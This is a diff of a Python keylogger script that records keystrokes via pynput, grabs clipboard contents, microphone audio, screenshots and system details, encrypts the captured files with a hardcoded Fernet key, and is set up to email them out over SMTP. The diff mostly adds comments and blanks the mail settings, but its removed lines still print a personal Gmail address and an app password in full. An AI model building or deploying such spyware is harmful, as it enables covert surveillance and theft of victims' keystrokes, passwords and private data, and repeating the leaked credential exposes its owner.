@@ -1,28 +1,28 @@
-from email.mime.multipart import MIMEMultipart
+from email.mime.multipart import MIMEMultipart  #import MIME Extension in email used for large files
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-import socket
-import platform
+import socket   # provides a way to create, connect,send and receive data
+import platform  # Used to retrieve information about os
 
-import win32clipboard
+import win32clipboard   # Area to store data
 
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener  # Control and monitor input devices
 
-import time
-import os
+import time  # To get current time 
+import os    # Information about Hardware component 
 
-from scipy.io.wavfile import write
-import sounddevice as sd
+from scipy.io.wavfile import write   # audio in linear pulse code
+import sounddevice as sd     # To play and run the audio file
 
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet   # For Encryption and Decryption of the file
 
-import getpass
+import getpass         # Secure way to handle the password
 from requests import get
 
-from multiprocessing import Process, freeze_support
+from multiprocessing import Process, freeze_support   # For concurrently using applications 
 from PIL import ImageGrab
 
 
@@ -32,14 +32,14 @@ clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 
-
+# Encrypted Files
 keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 audio_information_e = "e_audio.wav"
 screenshot_information_e = "e_screenshot.png"
 
-
+# Generate key for encryption
 key = "DdV1rNJ0ujTkZK00Xfd60Sq0Qa5T3-z8EEErhE425kI="
 
 microphone_time = 10
@@ -47,12 +47,12 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 
-email_address = "hasiniverma1@gmail.com"
-password = "gwwq uuap verd qhqs"  
+email_address = " "  # use any disposable email 
+password = " "  # password for the given email
 
 username = getpass.getuser()
 
-toaddr = "hasiniverma1@gmail.com"
+toaddr = " "  # use any disposable email 
 
 
 file_path = "D:"
@@ -69,10 +69,10 @@ filename3 = clipboard_information
 filename4 = audio_information
 filename5 = screenshot_information
 
+
 stoppingTime = 5
 
  
-
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -233,7 +233,7 @@ while number_of_iterations < number_of_iterations_end:
         
 
 
-
+# Encryption and Decryptioon Purpose
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + audio_information, file_merge + screenshot_information]
 encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + audio_information_e, file_merge + screenshot_information_e]
 
@@ -258,6 +258,5 @@ for encrypting_file in files_to_encrypt:
     
 time.sleep(120)
 
-import Generatekey
-import DecryptFile
+
 
